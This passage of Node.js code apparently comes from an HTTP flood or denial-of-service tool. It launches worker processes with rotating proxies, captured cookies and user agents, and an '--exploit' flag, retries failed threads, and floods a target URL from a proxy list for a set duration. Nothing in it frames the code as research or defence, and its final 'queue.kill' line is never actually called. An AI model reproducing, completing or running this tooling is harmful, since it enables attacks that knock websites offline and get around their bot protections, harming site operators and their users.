					proxyFile,
					"--proxy",
					response.browserProxy,
					"--cookie",
					response.cookies,
					"--ua",
					response.userAgent,
					"--http",
					1,
					"--exploit",
					true,
					"--sleep",
					true,
					"--debug",
					true,
				]);
			}


			await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
		} catch (exception) {
			colored(colors.COLOR_RED, exception);
			await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
		}
	}

	
}
var queue = async.queue(function (task, done) {
	startThread(targetURL, task.browserProxy, task, done);
}, threads);

async function main() {
	for (let i = 0; i < proxies.length; i++) {
		const browserProxy = randList(proxies);
		queue.push({ browserProxy: browserProxy });
	}
	await sleep(duration);
	queue.kill
}

main();
